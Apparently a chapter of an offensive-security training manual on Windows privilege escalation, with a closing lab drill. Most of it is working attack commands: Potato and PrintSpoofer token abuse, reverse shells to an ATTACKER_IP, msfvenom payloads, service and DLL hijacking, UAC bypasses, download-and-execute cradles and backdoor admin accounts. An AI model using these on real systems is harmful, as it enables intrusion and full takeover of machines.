# Chapter 08 — Privilege Escalation: Token Abuse & Service Exploits

**VADER-RCE Field Manual**
**Prerequisite**: Ch06 Windows Internals, Ch07 Initial Access
**Drill**: DRILLS/08_privesc/

---

## Why You Need This

You're in. You have a shell. It's running as `IIS APPPOOL\DefaultAppPool`
or `NT AUTHORITY\NETWORK SERVICE` or `user01` — some low-privilege
account. The target is SYSTEM. The gap is what this chapter closes.

Privilege escalation on Windows is not one technique. It is a catalogue
of misconfigurations, weak defaults, and design decisions that Microsoft
made 30 years ago and cannot walk back. The Potato family exploits a
DCOM authentication quirk that has existed in various forms since
Windows 2000. Unquoted service paths have been documented since XP.
AlwaysInstallElevated appears in every Windows build shipped to date.

Your job: land on a box, enumerate aggressively, match findings to
technique, execute. The methodology is linear. The execution is
mechanical. Done right, you go from `whoami` showing a service account
to `whoami` showing `nt authority\system` in under five minutes.

---

## Section 1 — Initial Privilege Assessment

Before you attack, know what you have. Run these immediately on every
shell you get:

```cmd
whoami /all              # full token: user, groups, privileges
whoami /priv             # just privileges
net user                 # local users
net localgroup           # local groups
net localgroup administrators   # who's admin

# Service context check:
echo %USERNAME%
echo %USERDOMAIN%

# System info:
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Environment:
set                      # environment variables — may contain credentials
```

Privileges to look for immediately:

```
CRITICAL (instant privesc path):
  SeImpersonatePrivilege    → Potato attacks → SYSTEM
  SeAssignPrimaryTokenPrivilege → token swap → SYSTEM
  SeTcbPrivilege            → act as OS → SYSTEM
  SeLoadDriverPrivilege     → load kernel driver → SYSTEM

USEFUL (indirect paths):
  SeDebugPrivilege          → open any process → credential theft / injection
  SeBackupPrivilege         → read any file regardless of ACL
  SeRestorePrivilege        → write any file regardless of ACL
  SeManageVolumePrivilege   → write raw disk sectors
  SeTakeOwnershipPrivilege  → take ownership of any object
```

If `SeImpersonatePrivilege` shows as Enabled — stop reading. Jump
to Section 2. You have a potato path.

---

## Section 2 — Token Impersonation and Potato Attacks

### The Potato Principle

Windows services running as `NETWORK SERVICE`, `LOCAL SERVICE`, or
a service account are granted `SeImpersonatePrivilege` by design.
This privilege allows a process to impersonate an authenticated user —
create a process that runs as that user's identity.

The potato techniques exploit this. They force a privileged account
(SYSTEM or a domain admin) to authenticate to a fake server controlled
by the attacker, capture that authentication, and use `SeImpersonatePrivilege`
to create a SYSTEM process.

The authentication coercion mechanism has evolved across potato variants
as Microsoft patched each specific hole. The underlying primitive — a
service account with SeImpersonatePrivilege can become SYSTEM — has
not changed.

### JuicyPotato (Legacy — pre-2019 Server, pre-1809 Workstation)

JuicyPotato coerces DCOM/COM authentication from a CLSID running as
SYSTEM. The target CLSID is the key — different CLSIDs work depending
on the OS version.

```cmd
# Check: does your shell have SeImpersonatePrivilege?
whoami /priv | findstr Impersonate

# Download JuicyPotato:
# https://github.com/ohpe/juicy-potato/releases

JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -t * -c {CLSID}

# Arguments:
# -l [port]    — local listening port (COM server)
# -p [prog]    — program to run as SYSTEM
# -t *         — try both CreateProcessWithTokenW and CreateProcessAsUser
# -c [CLSID]   — CLSID of a COM object running as SYSTEM
# -a "[args]"  — arguments for the program

# Common CLSIDs (Windows Server 2016):
# {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
# {4991D34B-80A1-4291-83B6-3328366B9097}
# {d99e6e74-fc88-11d0-b498-00a0c90312f3}

# Full CLSID lists:
# https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

### RoguePotato (Windows 10 1809+, Server 2019+)

JuicyPotato stopped working when Microsoft patched the specific DCOM
coercion path. RoguePotato reroutes the authentication through a fake
`oxid resolver` — a network service that DCOM queries to resolve
remote object references.

```cmd
# Requires: attacker machine listening on port 135
# On attacker (Linux):
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim:
RoguePotato.exe -r ATTACKER_IP -e "C:\windows\system32\cmd.exe" -l 9999

# Arguments:
# -r [IP]    — attacker IP (where fake oxid resolver runs)
# -e [prog]  — program to execute as SYSTEM
# -l [port]  — local port for fake COM server
```

### SweetPotato (Modern, Combined)

SweetPotato unifies several coercion techniques (PrintSpoofer, DCOM,
WTSUpdateClientCACertificates) into one binary. Best first-choice
potato on modern Windows.

```cmd
SweetPotato.exe -a "whoami"           # test as whoami
SweetPotato.exe -a "cmd /c whoami > C:\output.txt"   # redirect output
SweetPotato.exe -p cmd.exe            # pop a SYSTEM cmd.exe

# Method selection:
SweetPotato.exe -m DCOM -a "cmd.exe"        # DCOM coercion
SweetPotato.exe -m PrintSpoofer -a "cmd.exe" # PrintSpoofer coercion

# Pass args directly:
SweetPotato.exe -p C:\windows\system32\cmd.exe -a "/c net user hacked Password123! /add"
```

### PrintSpoofer (Standalone)

PrintSpoofer abuses the Print Spooler service to coerce SYSTEM
authentication via named pipe impersonation. Clean and reliable on
Windows 10 / Server 2019 where potato variants fail.

```cmd
# Requires: SeImpersonatePrivilege (standard for service accounts)

PrintSpoofer.exe -i -c cmd           # interactive SYSTEM shell
PrintSpoofer.exe -c "net user hacked P@ss1 /add && net localgroup administrators hacked /add"

# Spawn reverse shell:
PrintSpoofer.exe -c "C:\path\to\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Token Impersonation With Metasploit

If you already have a Meterpreter session:

```
# In Meterpreter:
use incognito
list_tokens -u              # list all tokens on the system

# Impersonate a token (requires SeImpersonatePrivilege):
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"

getuid                      # verify impersonation worked
getsystem                   # Metasploit's built-in getsystem (tries multiple techniques)
```

### Manual Token Duplication (C code concept)

Understanding what the tools do under the hood:

```c
// The manual token duplication flow:
// 1. Get SYSTEM process handle (e.g., winlogon.exe, lsass.exe)
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, system_pid);
// Requires SeDebugPrivilege if target is a privileged process

// 2. Open its token
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);

// 3. Duplicate the token (needs SeImpersonatePrivilege for impersonation token)
HANDLE hDupToken;
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
    SecurityImpersonation, TokenImpersonation, &hDupToken);

// 4. Create process with the duplicated token
CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
    L"C:\\Windows\\System32\\cmd.exe", NULL,
    CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
// → cmd.exe runs as SYSTEM
```

---

## Section 3 — Service Binary Path Hijacking

### Finding Writable Service Binaries

If a service runs as SYSTEM and you can write to its binary,
replace the binary with your payload. Next service restart = SYSTEM execution.

```cmd
# Enumerate services with weak binary permissions:
# Tool: accesschk.exe (Sysinternals)
accesschk.exe -uwvc "Everyone" *         # services writable by Everyone
accesschk.exe -uwvc "Users" *            # services writable by Users group
accesschk.exe -uwvc "%USERNAME%" *       # writable by current user

# Or manually check a specific service:
sc qc [service_name]                    # show service binary path
icacls "C:\path\to\service.exe"         # check permissions

# PowerShell approach:
Get-WmiObject -Class win32_service | 
  Select-Object Name, StartName, PathName | 
  Where-Object {$_.StartName -eq "LocalSystem"}
```

### Replacing The Binary

```cmd
# Copy current binary as backup:
copy "C:\path\to\service.exe" "C:\path\to\service.exe.bak"

# Drop your payload (e.g., reverse shell):
copy shell.exe "C:\path\to\service.exe"

# Restart the service:
sc stop [service_name]
sc start [service_name]

# Or if you can't restart, wait for system reboot:
# Create persistent trigger:
sc config [service_name] start= auto
shutdown /r /t 1
```

---

## Section 4 — Unquoted Service Paths

### The Vulnerability

If a service binary path contains spaces AND is not surrounded by
quotes, Windows has ambiguous parsing. It tries multiple locations
in order before finding the real binary.

```
Vulnerable: C:\Program Files\Some Service\service.exe
            (unquoted, has spaces)

Windows tries these in order:
  C:\Program.exe                      ← attacker creates this
  C:\Program Files\Some.exe           ← attacker creates this
  C:\Program Files\Some Service\service.exe  ← real binary (found last)

If attacker can write to C:\Program.exe or C:\Program Files\Some.exe,
that executable runs as whatever the service runs as.
```

### Finding Unquoted Service Paths

```cmd
# Direct query:
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell (cleaner):
Get-WmiObject -Class win32_service | 
  Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'} |
  Select-Object Name, PathName, StartName

# WinPEAS does this automatically (see Section 10)
```

### Exploiting The Path

```cmd
# Identified: C:\Program Files\Vulnerable App\app.exe runs as SYSTEM, unquoted

# Check if you can write to C:\Program Files\:
icacls "C:\Program Files"

# If writable, drop payload:
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

# Start the service:
sc start [vulnerable_service_name]
# Service starts → Windows finds C:\Program Files\Vulnerable.exe first → shell
```

---

## Section 5 — DLL Hijacking for Privesc

### How DLL Hijacking Works

When a process loads a DLL by name (without full path), Windows
searches locations in a specific order. If you can place a malicious
DLL earlier in the search path than the real DLL, yours loads instead.

```
Default DLL search order:
1. Directory of the application EXE
2. System directory (C:\Windows\System32)
3. 16-bit system directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. Current working directory
6. PATH directories

Safe DLL search mode (default, registry key):
  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode = 1
  → CWD moved to after system directories
```

### Finding DLL Hijack Opportunities

```cmd
# Method 1: Process Monitor (Procmon)
# Filter: Path ends with .dll AND Result is NAME NOT FOUND
# Watch service startup — any missing DLL in a writable location?

# Method 2: PowerUp (PowerShell privesc tool)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')
Invoke-AllChecks | findstr "DLL"

# Method 3: manual check of known-vulnerable apps
# Common targets: programs with DLLs in user-writable directories
```

### Planting The DLL

```cmd
# Generate malicious DLL:
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o hijacked.dll

# Or custom DLL (C):
# Must export the function the application expects:
#   __declspec(dllexport) void FunctionName() { /* payload */ }
# Plus a DllMain that runs on process attach

# Place DLL in hijackable location:
copy hijacked.dll "C:\Vulnerable App Directory\target.dll"

# Trigger: restart the application/service
```

---

## Section 6 — AlwaysInstallElevated

### The Misconfiguration

Two registry keys control MSI installation privilege. If BOTH are
set to 1, ANY user can install MSI packages as SYSTEM:

```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

# Both must be 1. One alone is insufficient.
```

### Checking

```cmd
# CMD:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell:
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

# WinPEAS checks this automatically
```

### Exploitation

```cmd
# Generate malicious MSI:
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Execute (will run as SYSTEM due to AlwaysInstallElevated):
msiexec /quiet /qn /i evil.msi

# Metasploit module:
use exploit/windows/local/always_install_elevated
```

---

## Section 7 — Scheduled Task Abuse

### Finding Abusable Tasks

Look for scheduled tasks that:
- Run as SYSTEM or a higher-privilege user
- Execute a file you can write to

```cmd
# List all scheduled tasks:
schtasks /query /fo LIST /v

# PowerShell (better filtering):
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
  Select-Object TaskName, TaskPath |
  ForEach-Object {
    $task = Get-ScheduledTaskInfo $_.TaskName
    $action = (Get-ScheduledTask -TaskName $_.TaskName).Actions
    [PSCustomObject]@{
      Name = $_.TaskName
      Execute = $action.Execute
      RunAs = (Get-ScheduledTask -TaskName $_.TaskName).Principal.UserId
    }
  }

# Check binary permissions for found tasks:
icacls "C:\path\to\task\binary.exe"
```

### Creating Privileged Scheduled Tasks

If you have local admin rights but need SYSTEM:

```cmd
# Schedule a task to run as SYSTEM:
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onstart /ru SYSTEM /f

# Trigger immediately:
schtasks /run /tn "WindowsUpdate"

# Delete after use:
schtasks /delete /tn "WindowsUpdate" /f
```

---

## Section 8 — UAC Bypass Techniques

### What UAC Does (And Doesn't Do)

UAC (User Account Control) is NOT a security boundary — Microsoft
officially states this. It is a convenience feature to prevent
accidental elevation. Bypassing UAC is not a privilege escalation
from low-privilege to admin — it is eliminating the pop-up requirement
for someone who is ALREADY a local admin.

**UAC bypass targets**: local admin accounts that have been split
into a filtered token (normal use) and an elevated token (admin use).
UAC bypass silently obtains the elevated token without prompting.

### UACME Method Index

UACME by @hfiref0x documents and implements dozens of UAC bypass
techniques. Each is numbered and targets specific Windows components.

```
Key techniques:

Method 33 (wusa.exe)     — extract DLL to trusted location via
                           Windows Update Standalone Installer
                           Works: Win 7-10 < 1709

Method 41 (SilentCleanup) — scheduled task with auto-elevate,
                            PATH hijack via environment variable
                            Works: Win 10 1703-1709

Method 59 (Slui.exe)     — file handler hijacking via registry
                            Works: Win 10 through recent builds

Method 61 (fodhelper.exe) — shell verb hijacking via HKCU registry
                            Works: Win 10 (extensively patched, variants exist)
```

### fodhelper.exe UAC Bypass (Classic Example)

```powershell
# fodhelper.exe auto-elevates and reads from HKCU registry
# Write to registry → triggers when fodhelper runs → runs as elevated admin

# Setup:
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
  -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
  -Name "(default)" -Value "cmd.exe" -Force

# Trigger:
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup after use:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### Bypassing UAC via ComputerDefaults.exe / sdclt.exe

```cmd
# Registry manipulation for sdclt.exe bypass:
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\payload.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f
sdclt.exe

# Cleanup:
reg delete "HKCU\Software\Classes\Folder" /f
```

---

## Section 9 — LOLBAS for Privilege Escalation

LOLBAS (Living Off The Land Binaries and Scripts) are legitimate
Windows tools that can be abused for malicious purposes. For privesc,
the useful categories are:

### Execute Payloads via Trusted Binaries

```cmd
# mshta.exe (Windows HTML Application Host):
mshta.exe javascript:a=(GetObject('script:http://ATTACKER/evil.sct')).Exec();close();

# regsvr32 (scriptlet execution):
regsvr32 /u /s /i:http://ATTACKER/evil.sct scrobj.dll

# certutil (download + decode):
certutil -decode encoded_payload.txt payload.exe
certutil -urlcache -split -f http://ATTACKER/payload.exe payload.exe

# bitsadmin (file transfer):
bitsadmin /transfer mydownloadjob /download /priority normal http://ATTACKER/payload.exe C:\payload.exe
```

### Write Files as SYSTEM (with service execution context)

```cmd
# If running as a service (SYSTEM), write to protected locations:
echo F > C:\Windows\System32\evil.dll    # create file (if SYSTEM)

# sc.exe to create/modify services:
sc create evilsvc binpath= "C:\payload.exe" start= auto
sc start evilsvc
```

### PsExec for Lateral Movement + Privesc

```cmd
# PsExec runs commands as SYSTEM:
psexec.exe -i -s cmd.exe               # interactive SYSTEM shell (requires admin)
psexec.exe \\TARGET -u admin -p pass cmd.exe  # remote SYSTEM shell
```

Full LOLBAS catalogue: https://lolbas-project.github.io/

---

## Section 10 — WinPEAS Enumeration

WinPEAS is the automated Windows privilege escalation enumeration tool.
Run it first on every new box. Read every line. Match findings to
techniques in this chapter.

### Running WinPEAS

```cmd
# Download:
# https://github.com/carlospolop/PEASS-ng/releases

# Run all checks (verbose):
winPEASany.exe

# Specific checks:
winPEASany.exe systeminfo userinfo      # system + user info only
winPEASany.exe servicesinfo             # service enumeration
winPEASany.exe applicationinfo         # installed applications
winPEASany.exe processinfo             # running processes
winPEASany.exe filesinfo               # file permissions

# Fast mode (less noise):
winPEASany.exe fast

# Redirect to file (colour codes break less):
winPEASany.exe > C:\output.txt 2>&1
type C:\output.txt | more
```

### Reading WinPEAS Output

WinPEAS colour-codes findings:

```
RED / HIGHLIGHTED  — high-impact finding, likely exploitable
YELLOW             — interesting, investigate further
GREEN              — info only, low impact
CYAN               — tool info, system details
```

WinPEAS checks (relevant to this chapter):

```
Privilege Checks:
  SeImpersonatePrivilege → immediately check for Potato viability
  SeAssignPrimaryTokenPrivilege → token swap path

Service Checks:
  "Services binary permissions" → service binary replaceable?
  "Unquoted Service Paths" → unquoted path with space?
  "Services with AlwaysRestart" → modifiable service config?

Registry Checks:
  "AlwaysInstallElevated" → both keys set?
  "Modifiable Registry AutoRuns" → writable autorun entries?

Task Checks:
  "Scheduled tasks with writable path"

DLL Checks:
  "DLL Hijacking in PATH" → writable directory before system dirs?

File Permissions:
  "Writable directories in PATH"
  "Files with interesting permissions"
```

### PowerUp (PowerShell Alternative)

```powershell
# PowerUp - comprehensive PowerShell privesc checker:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')

Invoke-AllChecks               # run everything
Get-ServiceUnquoted            # unquoted service paths
Get-ModifiableServiceFile      # writable service binaries
Get-ModifiableRegistryAutoRun  # modifiable autorun entries
Get-UnattendedInstallFile      # unattended install files with credentials
Get-Webconfig                  # web.config files with credentials
Get-ApplicationHost            # applicationHost.config with credentials
```

---

## Section 11 — The Privesc Decision Tree

```
INITIAL SHELL — WHAT DO YOU HAVE?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

whoami /priv
    │
    ├── SeImpersonatePrivilege ENABLED?
    │       → YES: Potato attack (SweetPotato first, then JuicyPotato/RoguePotato)
    │              PrintSpoofer if Spooler service running
    │              ↓
    │              → SYSTEM shell in 30 seconds
    │
    ├── SeDebugPrivilege ENABLED?
    │       → Migrate to SYSTEM process (Meterpreter)
    │       → Dump LSASS → credentials → Pass-the-Hash
    │
    └── No useful privileges? → Run WinPEAS

WinPEAS found:
    │
    ├── AlwaysInstallElevated = 1?
    │       → msfvenom MSI → msiexec → SYSTEM
    │
    ├── Unquoted service path in writable location?
    │       → Drop binary → restart service → SYSTEM
    │
    ├── Writable service binary?
    │       → Replace binary → restart service → SYSTEM
    │
    ├── Writable scheduled task binary?
    │       → Replace binary → trigger task → SYSTEM
    │
    ├── DLL hijacking opportunity?
    │       → Plant DLL → trigger load → SYSTEM
    │
    └── UAC only (already local admin)?
            → fodhelper / sdclt / UACME → elevated admin
            → then: SeImpersonatePrivilege path or sc create → SYSTEM
```

---

## Key Terms

| Term | Definition |
|------|-----------|
| **SeImpersonatePrivilege** | Privilege granted to service accounts allowing impersonation of authenticated users; exploited by all Potato variants |
| **Token impersonation** | Using a duplicated access token from a higher-privilege account to create processes running under that account's identity |
| **JuicyPotato** | Potato exploit variant using DCOM CLSID coercion; works on Windows Server 2016 and Windows 10 pre-1809 |
| **RoguePotato** | Potato variant using fake oxid resolver; works on Server 2019/Windows 10 1809+ where JuicyPotato was patched |
| **SweetPotato** | Combined potato tool targeting multiple coercion methods (DCOM, PrintSpoofer, WTSUpdateClientCACertificates) |
| **PrintSpoofer** | Print Spooler named pipe impersonation attack; exploits SYSTEM authentication coercion via named pipe |
| **Service binary hijacking** | Replacing a service's executable with a malicious payload when write permissions on the binary exist |
| **Unquoted service path** | Service binary path containing spaces without quotation marks; Windows tries intermediate paths, allowing binary planting |
| **DLL hijacking** | Placing a malicious DLL earlier in the search path than the legitimate DLL to have it loaded by a privileged process |
| **AlwaysInstallElevated** | Registry misconfig allowing any user to install MSI packages as SYSTEM |
| **UAC bypass** | Silently obtaining an elevated token for a local admin account without triggering the UAC consent prompt |
| **LOLBAS** | Living Off The Land Binaries and Scripts; legitimate Windows tools repurposed for malicious execution or file operations |
| **WinPEAS** | Automated Windows privilege escalation enumeration tool; colour-coded output highlighting exploitable misconfigurations |
| **EX_FAST_REF** | Kernel data structure storing a pointer with low bits used as reference count; must be masked to get the real address |
| **Filtered token** | Reduced-privilege token created by UAC for normal operation of a local admin; the elevated token is the real admin token |

---

## Drill 08 — Privilege Escalation Lab

Go to `DRILLS/08_privesc/`. Three target VMs, each with a different
escalation path. No hints about which path applies to which VM.

Your mission:

1. **VM-A**: Initial shell as `IIS APPPOOL\DefaultAppPool`.
   Run `whoami /priv`. Execute the appropriate technique. Get SYSTEM.
   Document the path: which privilege, which tool, exact command.

2. **VM-B**: Initial shell as `svc_vulnerable` (local user, low priv).
   Run WinPEAS. Identify the escalation vector from the output.
   Execute. Get SYSTEM. Document every WinPEAS finding that was relevant.

3. **VM-C**: Initial shell as local admin. UAC is enabled.
   Obtain an elevated shell without triggering the UAC prompt.
   Then escalate to SYSTEM.

For each VM, document:
- Initial privilege state (`whoami /all` output)
- Tool/technique used
- Exact commands executed
- Final `whoami` output showing SYSTEM

Time target: all three VMs in under 20 minutes combined.
If you're slower than that, you're spending too long enumerating
instead of pattern-matching to techniques. Speed comes from
internalising the decision tree until you don't need to look it up.
